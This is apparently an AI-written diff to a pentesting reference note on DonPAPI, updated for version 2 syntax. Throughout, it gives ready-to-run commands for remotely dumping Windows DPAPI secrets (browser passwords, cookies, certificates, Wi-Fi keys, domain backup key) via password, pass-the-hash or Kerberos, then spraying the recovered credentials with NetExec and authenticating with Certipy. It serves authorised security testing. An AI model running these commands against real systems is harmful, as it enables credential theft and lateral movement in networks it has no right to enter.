@@ -13,9 +13,11 @@ git clone https://github.com/login-securite/DonPAPI && pip install -r requiremen
 ```
 
 ```bash
-# Full dump — all DPAPI-protected secrets
-DonPAPI collect --dc-ip <dc-ip> -d DOMAIN -u Administrator -p Password -t 192.168.1.10
+# Full dump — all collectors, auto-fetch the domain backup key (v2.x)
+donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.10 --fetch-pvk
 ```
+
+> [!warning] **This is DonPAPI v2.x (verified against the repo).** The command is **`donpapi`** (lowercase) with two subcommands — **`collect`** and **`gui`** (there is **no `show`** subcommand). Target list is `-t` (accepts IPs / ranges / CIDR / hostnames / a file / `ALL`). Collection is selected with **`-c/--collectors`** (SharpHound-style list), not per-type flags. The v1 `DonPAPI.py -t ...` syntax and the `show`/`--browsers`/`DonPAPI.db` bits from older guides are gone.
 
 > [!note] **DonPAPI vs SharpDPAPI** — SharpDPAPI runs on the target (Windows binary). DonPAPI runs from Kali over SMB — no binary touches the target. Use DonPAPI when you have valid credentials/hash and want to pillage DPAPI secrets without any execution on the target host.
 
@@ -25,87 +27,74 @@ DonPAPI collect --dc-ip <dc-ip> -d DOMAIN -u Administrator -p Password -t 192.16
 
 ```bash
 # Password auth — single target
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password -t 192.168.1.10
+donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.10
 
-# Pass the Hash
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -H :NTLMhash -t 192.168.1.10
+# Pass the Hash (LMHASH:NTHASH — leading ':' = empty LM)
+donpapi collect -d DOMAIN -u Administrator -H :NTLMhash -t 192.168.1.10
 
-# Multiple targets
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password -t 192.168.1.10,192.168.1.20
+# Kerberos (ccache in KRB5CCNAME)
+donpapi collect -d DOMAIN -u Administrator -k --no-pass -t host.domain.local
 
-# Target from file
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password --targets-file hosts.txt
+# Multiple targets (space-separated), a file, a CIDR, or ALL (hostnames from LDAP)
+donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.10 192.168.1.20
+donpapi collect -d DOMAIN -u Administrator -p Password -t hosts.txt
+donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24
+donpapi collect -d DOMAIN -u Administrator -p Password -t ALL --dc-ip 192.168.1.1
 
-# Subnet
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24
+# Use LAPS to fetch the local-admin password per host instead of supplying one
+donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24 --laps Administrator
 ```
 
 ---
 
-## What Gets Dumped
+## What Gets Dumped (collectors)
 
-DonPAPI targets the following DPAPI-protected sources:
+Select with `-c/--collectors <name>,<name>` (default `All`). The v2 collector names:
 
-| Source | What's Recovered |
+| Collector | What's Recovered |
 |---|---|
-| Chrome / Edge | Saved passwords, cookies |
-| Firefox | Saved passwords (non-DPAPI but included) |
-| Windows Credential Manager | Stored domain creds, RDP passwords |
-| Certificates | User + machine certificates with private keys |
-| WiFi profiles | PSK for all saved wireless networks |
-| Windows Vault | App-specific stored credentials |
-| DPAPI master keys | Raw keys (for offline decryption) |
-| SAM hashes | Local account NTLM hashes |
-| LSA secrets | Service account passwords, cached creds |
+| `Chromium` | Chrome/Edge saved passwords, cookies, Chrome refresh token |
+| `Firefox` | Firefox saved passwords + cookies |
+| `CredMan` | Windows Credential Manager (domain creds, RDP passwords) |
+| `Certificates` | User + machine certificates with private keys |
+| `Vaults` | Windows Vault app-specific credentials |
+| `Wifi` | PSK for saved wireless networks |
+| `Files` | Interesting files (config/creds) off the host |
+| `MobaXterm` / `MRemoteNG` / `RDCMan` | Saved sessions/passwords from those clients |
+| `SCCM` | SCCM network-access-account / task-sequence creds |
+| `VNC` | Stored VNC passwords |
+
+DPAPI master keys are decrypted along the way (via `--fetch-pvk`/`--pvkfile`/`--pwdfile`/`--ntfile`/`--mkfile`). Remote-registry secrets (SAM/LSA/DPAPI-System) come from RemoteOps, on by default — disable with `-nr/--no-remoteops`.
 
 ---
 
 ## Targeted Collection
 
 ```bash
-# Only browser credentials
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --browsers
+# Only browsers
+donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c Chromium,Firefox
 
 # Only certificates
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --certificates
+donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c Certificates
 
-# Only WiFi passwords
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --wifi
+# Credential Manager + Vaults + Wifi
+donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c CredMan,Vaults,Wifi
 
-# Only Credential Manager
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --credentials
-
-# Only SAM + LSA (no DPAPI)
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --sam --lsa
+# Everything but skip remote-registry ops (quieter)
+donpapi collect -d DOMAIN -u user -p Password -t 192.168.1.10 -c All -nr
 ```
 
 ---
 
-## Output
+## Output & Browsing
 
-DonPAPI stores results in a local SQLite database (`DonPAPI.db`) and prints findings to console.
+Loot lands in **`~/.donpapi/loot/`** (override with `-o DIRNAME`); you browse it in the web GUI — there is **no `show` command**.
 
 ```bash
-# Results are written to DonPAPI.db in the current directory
-# View with sqlite3 or the built-in reporting
-
-# List collected results from DB
-DonPAPI show
-
-# Show credentials only
-DonPAPI show --credentials
-
-# Show browser passwords
-DonPAPI show --browsers
-
-# Export to text
-DonPAPI show > donpapi_results.txt
-
-# Browse DB directly
-sqlite3 DonPAPI.db
-sqlite> .tables
-sqlite> SELECT target, username, password FROM credentials;
-sqlite> SELECT url, username, password FROM browser_passwords;
+# Launch the web UI to search/export secrets, cookies and certificates
+donpapi gui
+donpapi gui --port 9001 --basic-auth user:pass      # bind options: --bind, --port, --ssl, --basic-auth
+# The certificates view generates a ready-to-run Certipy command for client-auth certs.
 ```
 
 ---
@@ -122,9 +111,14 @@ secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local | grep -i "dpapi"
 # Via Mimikatz on DC:
 # lsadump::backupkeys /export  → produces ntbackup.pvk
 
-# Run DonPAPI with the backup key
-DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password \
-  -t 192.168.1.0/24 --pvk domain_backup.pvk
+# Easiest: let DonPAPI fetch + cache the backup key itself (dumps it off a DC if needed)
+donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24 --fetch-pvk
+
+# Or supply a .pvk you already have (flag is --pvkfile, not --pvk)
+donpapi collect -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24 --pvkfile domain_backup.pvk
+
+# Feed known secrets to unlock masterkeys without the pvk:
+#   --pwdfile user:password   --ntfile user:nthash   --mkfile {GUID}:SHA1
 ```
 
 ---
@@ -133,27 +127,21 @@ DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password \
 
 ```bash
 # Proxychains
-proxychains DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.10.5
+proxychains donpapi collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.10.5
 ```
 
 ---
 
 ## Common Post-Collection Actions
 
+Export secrets/cookies as CSV from the `donpapi gui` (Secrets / Cookies / Certificates screens), then:
+
 ```bash
-# Extract Chrome passwords for credential spraying
-sqlite3 DonPAPI.db "SELECT username, password FROM browser_passwords WHERE browser='chrome';" | \
-  awk -F'|' '{print $1":"$2}' > chrome_creds.txt
-
-# Extract all plaintext passwords found
-sqlite3 DonPAPI.db "SELECT username, password FROM credentials WHERE password IS NOT NULL;" | \
-  awk -F'|' '{print $1":"$2}' > plaintexts.txt
-
-# Test found credentials with NetExec
+# Turn an exported user:password CSV into a spray list and test with NetExec
+awk -F',' 'NR>1{print $1":"$2}' secrets_export.csv > plaintexts.txt
 netexec smb 192.168.1.0/24 -u user -p plaintexts.txt --continue-on-success
 
-# Certificates — export and use with Certipy for ADCS abuse
-# DonPAPI exports .pfx files to local directory
+# Client-auth certificates: the GUI hands you a ready Certipy command; or use an exported .pfx
 certipy auth -pfx exported_cert.pfx -dc-ip 192.168.1.1
 ```
 
@@ -169,6 +157,10 @@ certipy auth -pfx exported_cert.pfx -dc-ip 192.168.1.1
 
 ---
 
+> [!note] **See also** — the on-host Windows counterpart is [[Tools/Credential Dumping/SharpDPAPI|SharpDPAPI]] (same DPAPI loot, but a binary runs on the target). Recovered client-auth certs feed [[Tools/AD/Certipy|Certipy]]; `--laps` pulls from [[Tools/AD/LAPSToolkit|LAPS]]; test looted creds with [[Tools/Lateral Movement/NetExec|NetExec]].
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
